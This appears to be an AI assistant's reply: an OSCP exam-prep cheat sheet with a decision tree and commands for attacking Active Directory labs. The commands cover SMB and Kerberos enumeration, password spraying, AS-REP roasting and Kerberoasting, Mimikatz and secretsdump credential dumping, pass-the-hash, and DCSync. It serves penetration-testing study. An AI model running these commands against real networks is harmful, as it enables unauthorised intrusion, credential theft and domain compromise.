# 🧭 OSCP AD Attack Flow (Decision Tree)

```mermaid
flowchart TD
    A[Start: Got Target IP] --> B[Nmap Scan]
    B --> C{SMB/LDAP/Kerberos?}

    C -->|Yes| D[Enumerate SMB + Users]
    C -->|No| Z[Look for other services]

    D --> E{Valid Users Found?}
    E -->|No| D1[RID brute / Kerbrute]
    E -->|Yes| F[Password Spray]

    F --> G{Valid Creds?}
    G -->|No| H[AS-REP / Kerberoast]
    G -->|Yes| I[Login (WinRM/SMB/RDP)]

    H --> H1{Hashes cracked?}
    H1 -->|Yes| I
    H1 -->|No| D

    I --> J[Enumerate as User]
    J --> K[BloodHound + Shares + Files]

    K --> L{PrivEsc on MS01?}
    L -->|Yes| M[Local Admin Access]
    L -->|No| N[Find more creds]

    M --> O[Dump Credentials]
    O --> P{New Creds?}
    P -->|Yes| Q[Lateral Movement]
    P -->|No| N

    Q --> R{Access MS02/DC?}
    R -->|MS02| S[Repeat Enum + PrivEsc]
    R -->|DC| T[Domain Compromise]

    T --> U[DCSync / NTDS Dump]
```

---

# 🧱 STEP-BY-STEP FLOW (WITH COMMANDS)

---

## 🟢 1. Initial Access

### 🔍 Scan

```bash
nmap -p- -T4 $IP
nmap -sC -sV -p <ports> $IP
```

👉 **If you see:**

- 445 → SMB
    
- 88 → Kerberos
    
- 389 → LDAP  
    ➡️ You are in **AD land**
    

---

## 🟡 2. Enumeration (No Creds)

### 🔓 SMB Null / Guest

```bash
nxc smb $IP -u '' -p '' --shares
nxc smb $IP -u 'guest' -p '' --shares
```

---

### 👤 User Discovery

```bash
nxc smb $IP -u '' -p '' --rid-brute
kerbrute userenum -d <domain> --dc <DC_IP> users.txt
```

---

### ❓ Decision

➡️ **Got users?**

- YES → Password spray
    
- NO → Expand enumeration (LDAP, web, etc.)
    

---

## 🟠 3. Credential Attacks

### 🔐 Password Spray

```bash
nxc smb $IP -u users.txt -p passwords.txt
nxc winrm $IP -u users.txt -p passwords.txt
```

---

### 🎫 AS-REP Roast (No creds needed)

```bash
impacket-GetNPUsers <domain>/ -usersfile users.txt -dc-ip <DC_IP>
john hash.asreproast
```

---

### 🎟️ Kerberoast (Needs creds)

```bash
impacket-GetUserSPNs <domain>/<user>:<pass> -dc-ip <DC_IP> -request
john hash.kerberoast
```

---

### ❓ Decision

➡️ **Got credentials?**

- YES → Login
    
- NO → Go back to enum / try different lists
    

---

## 🔵 4. Initial Foothold

### 🚪 Access

```bash
evil-winrm -i $IP -u <user> -p <pass>
xfreerdp3 /v:$IP /u:<user> /p:<pass>
```

---

## 🟣 5. Post-Login Enumeration

### 🔍 Quick Checks

```powershell
whoami /all
hostname
ipconfig
```

---

### 🧠 BloodHound

```bash
nxc ldap <ip> -u <user> -p <pass> --bloodhound --collection All --dns-server <DC_IP>
```

---

### 📂 File Hunting

```powershell
tree /F /A C:\Users\
```

Look for:

- passwords.txt
    
- config files
    
- scripts
    

---

## 🔴 6. Privilege Escalation (MS01)

### ⚙️ Automated Enum

```powershell
# Windows tools
WinPEAS.exe
PrivEscCheck.exe
```

---

### 🔑 Key Checks

- Token privileges:
    

```powershell
whoami /all
```

👉 Look for:

- `SeImpersonatePrivilege`
    

---

- Services:
    
    - Unquoted paths
        
    - Writable binaries
        
- Scheduled tasks
    
- DLL hijacking
    

---

### ❓ Decision

➡️ **Got Admin?**

- YES → Dump creds
    
- NO → Search files / creds
    

---

## 🟤 7. Credential Dumping

### 🧠 Mimikatz (Windows)

```powershell
mimikatz
sekurlsa::logonpasswords
```

---

### 🐍 Secretsdump (Kali)

```bash
impacket-secretsdump <domain>/<user>@<IP>
```

---

### ❓ Decision

➡️ **New creds found?**

- YES → Lateral movement
    
- NO → File hunting / pivot
    

---

## 🟠 8. Lateral Movement

### 🔁 Try EVERYTHING

```bash
nxc smb/winrm/rdp/mssql $IP -u <user> -p <pass>
```

---

### 🔓 Pass-the-Hash

```bash
evil-winrm -i $IP -u <user> -H <hash>
```

---

### 🎟️ Pass-the-Ticket (Windows)

```powershell
kerberos::ptt ticket.kirbi
```

---

### 🧠 Check BloodHound Again

👉 Look for:

- `GenericAll`
    
- `WriteDACL`
    
- `ForceChangePassword`
    

---

### ❓ Decision

➡️ **Reached MS02 or DC?**

- MS02 → Repeat PrivEsc
    
- DC → Domain compromise
    

---

## 👑 9. Domain Compromise

### 💥 DCSync

```powershell
lsadump::dcsync /domain:<domain> /user:<user>
```

---

### 🧬 Dump NTDS

```bash
impacket-secretsdump <domain>/<user>@<DC_IP>
```

---

### 🔐 GPP Passwords

```bash
smbclient //DC_IP/SYSVOL
```

Search for:

- Groups.xml
    
- ScheduledTasks.xml
    

---

# ⚡ OSCP MINDSET (IMPORTANT)

### 🔁 Always Loop:

- New creds → retry all protocols
    
- New machine → repeat enum + privesc
    

---

### 🧠 If Stuck:

1. Re-check SMB shares
    
2. Re-run BloodHound
    
3. Search filesystem manually
    
4. Try **every credential everywhere**
    

---

### 🎯 Key Principle:

> **AD is a credential game, not an exploit game**

---

If you want, I can compress this into a **super aggressive 1-page “during-exam” checklist** (even shorter than this) or tailor it specifically to **PG Practice / OSCP AD sets**.